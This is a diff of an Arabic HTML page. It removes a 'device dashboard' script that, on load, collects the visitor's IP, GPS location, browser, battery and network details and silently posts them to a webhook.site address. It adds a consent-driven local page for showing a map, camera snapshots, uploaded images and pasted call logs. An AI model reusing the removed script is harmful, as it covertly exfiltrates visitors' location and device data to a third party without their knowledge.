@@ -1,139 +1,209 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>📋 لوحة المعلومات</title>
-  <style>
-    body { font-family: Arial, sans-serif; direction: rtl; margin: 20px; }
-    table { border-collapse: collapse; width: 100%; margin-top: 15px; }
-    td, th { border: 1px solid #ccc; padding: 8px; text-align: left; }
-    th { background: #f2f2f2; }
-    #map { width: 100%; height: 300px; margin-top: 15px; border: 1px solid #ccc; }
-    button { margin-top: 15px; padding: 10px 15px; cursor: pointer; }
-  </style>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>عرض — صور / سجل مكالمات / موقع</title>
+<style>
+  body{font-family:Tahoma,Arial;direction:rtl;padding:14px;background:#f6f8fb;color:#111}
+  .card{max-width:900px;margin:10px auto;background:#fff;padding:14px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
+  h1{margin:0 0 8px;color:#0b63a8}
+  .row{display:flex;gap:8px;flex-wrap:wrap;margin:8px 0}
+  button{padding:8px 12px;border-radius:8px;border:0;background:#1976d2;color:#fff;cursor:pointer}
+  button.ghost{background:#fff;color:#1976d2;border:1px solid #1976d2}
+  .muted{color:#666;font-size:14px}
+  #map{width:100%;height:260px;border-radius:8px;border:1px solid #e0e0e0;margin-top:10px}
+  .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;margin-top:10px}
+  .thumb{height:110px;overflow:hidden;border-radius:8px;background:#eee;display:flex;align-items:center;justify-content:center}
+  textarea{width:100%;min-height:120px;padding:10px;border-radius:8px;border:1px solid #ddd}
+  .note{font-size:13px;color:#444;margin-top:8px}
+</style>
 </head>
 <body>
-  <h2>📊 لوحة معلومات جهازك</h2>
-  <table>
-    <tr><th>المعلومة</th><th>القيمة</th></tr>
-    <tr><td>المتصفح / الجهاز</td><td id="ua"></td></tr>
-    <tr><td>النظام</td><td id="os"></td></tr>
-    <tr><td>المتصفح</td><td id="browser"></td></tr>
-    <tr><td>عنوان IP</td><td id="ip"></td></tr>
-    <tr><td>التاريخ والوقت</td><td id="time"></td></tr>
-    <tr><td>الموقع (GPS)</td><td id="location"></td></tr>
-    <tr><td>البطارية</td><td id="battery"></td></tr>
-    <tr><td>نوع الشبكة</td><td id="network"></td></tr>
-  </table>
+  <div class="card">
+    <h1>عرض: صور — سجل المكالمات — الموقع</h1>
+    <p class="muted">هذه صفحة تعرض صور (رفع أو كاميرا)، تُظهر الموقع بعد الموافقة، ويمكنك لصق سجل المكالمات لعرضه. لا تزال كل خطوة بيدك (موافقة/رفع).</p>
 
-  <div id="map">🗺️ جاري تحميل الخريطة...</div>
-  <button onclick="copyInfo()">📋 انسخ كل المعلومات</button>
+    <div class="row">
+      <button id="btnGetLoc">اطلب الموقع & اعرض الخريطة</button>
+      <button id="btnOpenCam">افتح الكاميرا (التصوير فوري)</button>
+      <label class="ghost" for="fileImg">رفع صور من الجهاز</label>
+      <input id="fileImg" type="file" accept="image/*" multiple style="display:none">
+      <button id="btnClear" class="ghost">مسح العرض</button>
+    </div>
 
-  <script>
-    const webhook = "https://webhook.site/39fd585b-d6ee-4ca0-814f-0840a0fa0037";
-    const data = {};
+    <div id="map" class="muted">الخريطة ستظهر هنا بعد السماح للموقع.</div>
 
-    // User Agent
-    data.userAgent = navigator.userAgent;
-    document.getElementById("ua").innerText = data.userAgent;
+    <h3 style="margin-top:12px">الصور</h3>
+    <div id="imgGrid" class="grid">
+      <!-- thumbs -->
+    </div>
 
-    // Detect OS & Browser
-    function detectBrowserOS(ua){
-      let os = "غير معروف", browser = "غير معروف";
-      if(ua.indexOf("Win")!=-1) os="Windows";
-      else if(ua.indexOf("Mac")!=-1) os="MacOS";
-      else if(ua.indexOf("Linux")!=-1) os="Linux";
-      else if(ua.indexOf("Android")!=-1) os="Android";
-      else if(ua.indexOf("iPhone")!=-1) os="iOS";
+    <h3 style="margin-top:12px">كاميرا مباشرة (إن سمحت)</h3>
+    <video id="camPreview" autoplay playsinline style="width:100%;max-height:360px;border-radius:8px;background:#000;display:none"></video>
+    <div class="row" style="margin-top:8px">
+      <button id="btnSnap" class="ghost" style="display:none">التقط صورة</button>
+    </div>
 
-      if(ua.indexOf("Chrome")!=-1) browser="Chrome";
-      else if(ua.indexOf("Firefox")!=-1) browser="Firefox";
-      else if(ua.indexOf("Safari")!=-1) browser="Safari";
-      else if(ua.indexOf("Edge")!=-1) browser="Edge";
+    <h3 style="margin-top:12px">سجل المكالمات (انسخ والصقه هنا)</h3>
+    <p class="muted">انسخ من سجل المكالمات أو اكتب بعض الأسطر لتمثيل البيانات؛ سيظهر تلقائياً.</p>
+    <textarea id="callsInput" placeholder="مثال: اسم,رقم,نوع(واردة/صادرة/فائتة),مدة(ث),2025-09-23 10:12&#10;أبو خالد,+971501234567,واردة,120,2025-09-23 10:12"></textarea>
+    <div class="row">
+      <button id="btnParse">عرض سجل المكالمات</button>
+      <button id="btnClearCalls" class="ghost">مسح السجل</button>
+    </div>
 
-      return {os, browser};
+    <table id="callsTable" style="width:100%;border-collapse:collapse;margin-top:10px;display:none">
+      <thead style="background:#f2f2f2"><tr><th>الاسم</th><th>الرقم</th><th>النوع</th><th>المدة (ث)</th><th>التاريخ</th></tr></thead>
+      <tbody></tbody>
+    </table>
+
+    <p class="note">ملاحظة: صفحة الويب لا تستطيع الوصول تلقائياً لسجل المكالمات أو صور الجهاز دون موافقتك أو تطبيق مثبت — هذه الطريقة تضمن توضيح الفكرة بطريقة قانونية وآمنة.</p>
+  </div>
+
+<script>
+/* عناصر */
+const btnGetLoc = document.getElementById('btnGetLoc');
+const mapDiv = document.getElementById('map');
+const fileImg = document.getElementById('fileImg');
+const imgGrid = document.getElementById('imgGrid');
+const btnOpenCam = document.getElementById('btnOpenCam');
+const camPreview = document.getElementById('camPreview');
+const btnSnap = document.getElementById('btnSnap');
+const btnClear = document.getElementById('btnClear');
+const callsInput = document.getElementById('callsInput');
+const btnParse = document.getElementById('btnParse');
+const callsTable = document.getElementById('callsTable');
+const callsBody = callsTable.querySelector('tbody');
+const btnClearCalls = document.getElementById('btnClearCalls');
+
+let streamRef = null;
+
+/* الموقع */
+btnGetLoc.addEventListener('click', ()=> {
+  if (!navigator.geolocation) {
+    mapDiv.innerText = 'المتصفح لا يدعم الموقع.';
+    return;
+  }
+  mapDiv.innerText = 'جاري طلب الموقع — راجع الإذن في المتصفح...';
+  navigator.geolocation.getCurrentPosition(pos => {
+    const lat = pos.coords.latitude.toFixed(6);
+    const lon = pos.coords.longitude.toFixed(6);
+    mapDiv.innerHTML = `<iframe width="100%" height="100%" style="border:0" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>
+      <div style="margin-top:6px;font-size:14px;color:#333">خط العرض: ${lat} — خط الطول: ${lon} — دقة ≈ ${pos.coords.accuracy} متر</div>`;
+  }, err => {
+    mapDiv.innerText = 'تم رفض الموقع أو حصل خطأ: ' + (err.message || err.code);
+  }, {enableHighAccuracy:true, timeout:10000});
+});
+
+/* رفع صور */
+fileImg.addEventListener('change', ev => {
+  const files = Array.from(ev.target.files).slice(0,10);
+  imgGrid.innerHTML = '';
+  files.forEach(f=>{
+    const reader = new FileReader();
+    reader.onload = () => {
+      const d = document.createElement('div');
+      d.className = 'thumb';
+      d.innerHTML = `<img src="${reader.result}" style="width:100%;height:100%;object-fit:cover">`;
+      imgGrid.appendChild(d);
+    };
+    reader.readAsDataURL(f);
+  });
+});
+
+/* الكاميرا */
+btnOpenCam.addEventListener('click', async ()=>{
+  if (camPreview.style.display === 'none') {
+    try {
+      const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}, audio:false});
+      streamRef = s;
+      camPreview.srcObject = s;
+      camPreview.style.display = 'block';
+      btnSnap.style.display = 'inline-block';
+      btnOpenCam.innerText = 'أغلق الكاميرا';
+    } catch(e) {
+      alert('فشل فتح الكاميرا: ' + (e.message||e));
     }
-    let detect = detectBrowserOS(data.userAgent);
-    data.os = detect.os; data.browser = detect.browser;
-    document.getElementById("os").innerText = data.os;
-    document.getElementById("browser").innerText = data.browser;
-
-    // Time
-    data.time = new Date().toLocaleString();
-    document.getElementById("time").innerText = data.time;
-
-    // IP
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(ipdata => {
-        data.ip = ipdata.ip;
-        document.getElementById("ip").innerText = data.ip;
-      });
-
-    // Battery
-    if(navigator.getBattery){
-      navigator.getBattery().then(bat => {
-        data.battery = `${(bat.level*100).toFixed(0)}% ${bat.charging?"⚡ شحن":"🔋 غير مشحون"}`;
-        document.getElementById("battery").innerText = data.battery;
-      });
-    } else {
-      data.battery = "غير مدعوم";
-      document.getElementById("battery").innerText = data.battery;
+  } else {
+    // اغلاق
+    if (streamRef) {
+      streamRef.getTracks().forEach(t=>t.stop());
+      streamRef = null;
     }
+    camPreview.style.display = 'none';
+    btnSnap.style.display = 'none';
+    btnOpenCam.innerText = 'افتح الكاميرا (التصوير فوري)';
+  }
+});
 
-    // Network
-    if(navigator.connection){
-      data.network = `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mb)`;
-      document.getElementById("network").innerText = data.network;
-    } else {
-      data.network = "غير مدعوم";
-      document.getElementById("network").innerText = data.network;
-    }
+btnSnap.addEventListener('click', ()=>{
+  if (!streamRef) return;
+  const video = camPreview;
+  const w = video.videoWidth, h = video.videoHeight;
+  const c = document.createElement('canvas');
+  c.width = w; c.height = h;
+  c.getContext('2d').drawImage(video,0,0,w,h);
+  const data = c.toDataURL('image/jpeg', 0.85);
+  const d = document.createElement('div');
+  d.className = 'thumb';
+  d.innerHTML = `<img src="${data}" style="width:100%;height:100%;object-fit:cover">`;
+  imgGrid.prepend(d);
+});
 
-    // GPS + Map
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        pos => {
-          let lat = pos.coords.latitude.toFixed(5);
-          let lon = pos.coords.longitude.toFixed(5);
-          data.location = `خط العرض: ${lat}, خط الطول: ${lon}`;
-          document.getElementById("location").innerText = data.location;
+/* مسح العرض */
+btnClear.addEventListener('click', ()=>{
+  imgGrid.innerHTML = '';
+  mapDiv.innerHTML = 'الخريطة ستظهر هنا بعد السماح للموقع.';
+  if (streamRef) streamRef.getTracks().forEach(t=>t.stop());
+  camPreview.style.display = 'none';
+  btnSnap.style.display = 'none';
+  btnOpenCam.innerText = 'افتح الكاميرا (التصوير فوري)';
+  callsInput.value = '';
+  callsBody.innerHTML = '';
+  callsTable.style.display = 'none';
+});
 
-          let mapFrame = `<iframe width="100%" height="300" 
-            src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;
-          document.getElementById("map").innerHTML = mapFrame;
+/* معالجة سجل المكالمات من نص منسوخ */
+btnParse.addEventListener('click', ()=>{
+  const txt = callsInput.value.trim();
+  if (!txt) { alert('الصق أو أدخل بيانات السجل أولاً'); return; }
+  // نتوقع أسطر مفصولة بسطر جديد، كل سطر: name,number,type,duration,date
+  const lines = txt.split(/\r?\n/).map(l=>l.trim()).filter(Boolean);
+  callsBody.innerHTML = '';
+  lines.forEach(line=>{
+    const parts = line.split(',');
+    const name = (parts[0]||'—').trim();
+    const number = (parts[1]||'—').trim();
+    const type = (parts[2]||'—').trim();
+    const dur = (parts[3]||'0').trim();
+    const date = (parts[4]||'—').trim();
+    const tr = document.createElement('tr');
+    tr.innerHTML = `<td>${escapeHtml(name)}</td><td>${escapeHtml(number)}</td><td>${escapeHtml(type)}</td><td>${escapeHtml(dur)}</td><td>${escapeHtml(date)}</td>`;
+    callsBody.appendChild(tr);
+  });
+  callsTable.style.display = 'table';
+});
 
-          // Send to Webhook
-          sendToWebhook();
-        },
-        err => {
-          data.location = "🚫 رفض السماح بالموقع";
-          document.getElementById("location").innerText = data.location;
-          document.getElementById("map").innerText = "لا يمكن عرض الخريطة.";
-          sendToWebhook();
-        }
-      );
-    } else {
-      data.location = "غير مدعوم";
-      document.getElementById("location").innerText = data.location;
-      document.getElementById("map").innerText = "لا يمكن عرض الخريطة.";
-      sendToWebhook();
-    }
+/* مسح السجل */
+btnClearCalls.addEventListener('click', ()=> {
+  callsInput.value = '';
+  callsBody.innerHTML = '';
+  callsTable.style.display = 'none';
+});
 
-    // Copy button
-    function copyInfo(){
-      let text = `المتصفح/الجهاز: ${data.userAgent}\nالنظام: ${data.os}\nالمتصفح: ${data.browser}\nIP: ${data.ip}\nالوقت: ${data.time}\nالموقع: ${data.location}\nالبطارية: ${data.battery}\nالشبكة: ${data.network}`;
-      navigator.clipboard.writeText(text).then(()=>alert("✅ تم نسخ المعلومات!"));
-    }
+/* مساعدة: تهرب HTML نص */
+function escapeHtml(s){ return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
 
-    // Send data to Webhook
-    function sendToWebhook(){
-      fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
-    }
-  </script>
+/* عند فتح الصفحة تلقائياً نعرض أي صور افتراضية صغيرة */
+(function initPlaceholders(){
+  imgGrid.innerHTML = '';
+  const svg1 = 'data:image/svg+xml;utf8,' + encodeURIComponent(`<svg xmlns='http://www.w3.org/2000/svg' width='400' height='300'><rect width='100%' height='100%' fill='#e0e0e0'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' fill='#666' font-size='20'>صورة توضيحية</text></svg>`);
+  const svg2 = 'data:image/svg+xml;utf8,' + encodeURIComponent(`<svg xmlns='http://www.w3.org/2000/svg' width='400' height='300'><rect width='100%' height='100%' fill='#ffe0b2'/><text x='50%' y='50%' dominant-baseline='middle' text-anchor='middle' fill='#666' font-size='20'>مثال صورة</text></svg>`);
+  [svg1,svg2].forEach(src=>{
+    const d = document.createElement('div'); d.className='thumb'; d.innerHTML = `<img src="${src}" style="width:100%;height:100%;object-fit:cover">`; imgGrid.appendChild(d);
+  });
+})();
+</script>
 </body>
 </html>
